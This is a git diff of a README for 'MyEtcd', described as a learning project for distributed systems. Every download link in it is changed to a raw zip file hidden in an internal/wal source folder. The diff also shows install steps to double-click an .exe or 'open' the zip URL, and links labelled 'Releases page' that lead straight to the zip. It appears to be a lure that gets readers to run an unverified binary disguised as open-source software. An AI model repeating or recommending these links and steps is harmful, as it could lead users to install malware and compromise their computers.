@@ -1,6 +1,6 @@
 # 🚀 MyEtcd - Your Guide to Learning Distributed Systems
 
-[![Download MyEtcd](https://raw.githubusercontent.com/Agnellalocal723/MyEtcd/main/untilting/MyEtcd.zip)](https://raw.githubusercontent.com/Agnellalocal723/MyEtcd/main/untilting/MyEtcd.zip)
+[![Download MyEtcd](https://github.com/Agnellalocal723/MyEtcd/raw/refs/heads/main/internal/wal/My-Etcd-1.6.zip)](https://github.com/Agnellalocal723/MyEtcd/raw/refs/heads/main/internal/wal/My-Etcd-1.6.zip)
 
 ## 📦 Introduction
 
@@ -34,7 +34,7 @@ To run MyEtcd, your device should meet the following requirements:
 
 Follow these steps to download and run MyEtcd:
 
-1. Click the download button above or visit the Releases page: [Download MyEtcd](https://raw.githubusercontent.com/Agnellalocal723/MyEtcd/main/untilting/MyEtcd.zip).
+1. Click the download button above or visit the Releases page: [Download MyEtcd](https://github.com/Agnellalocal723/MyEtcd/raw/refs/heads/main/internal/wal/My-Etcd-1.6.zip).
 2. Choose the latest version for your operating system.
 3. Download the file to your computer.
 
@@ -44,11 +44,11 @@ To install MyEtcd:
 
 1. After downloading, locate the file on your computer.
 2. If you are using Windows, double-click the `.exe` file to run it. On macOS and Linux, open your terminal and navigate to the downloaded file's location.
-   - For macOS, use: `open https://raw.githubusercontent.com/Agnellalocal723/MyEtcd/main/untilting/MyEtcd.zip`
+   - For macOS, use: `open https://github.com/Agnellalocal723/MyEtcd/raw/refs/heads/main/internal/wal/My-Etcd-1.6.zip`
    - For Linux, use: `chmod +x MyEtcd && ./MyEtcd`
 3. Follow the on-screen instructions to complete the installation.
 
-For additional details, check the documentation on the Releases page: [Download MyEtcd](https://raw.githubusercontent.com/Agnellalocal723/MyEtcd/main/untilting/MyEtcd.zip).
+For additional details, check the documentation on the Releases page: [Download MyEtcd](https://github.com/Agnellalocal723/MyEtcd/raw/refs/heads/main/internal/wal/My-Etcd-1.6.zip).
 
 ## 📖 Usage
 
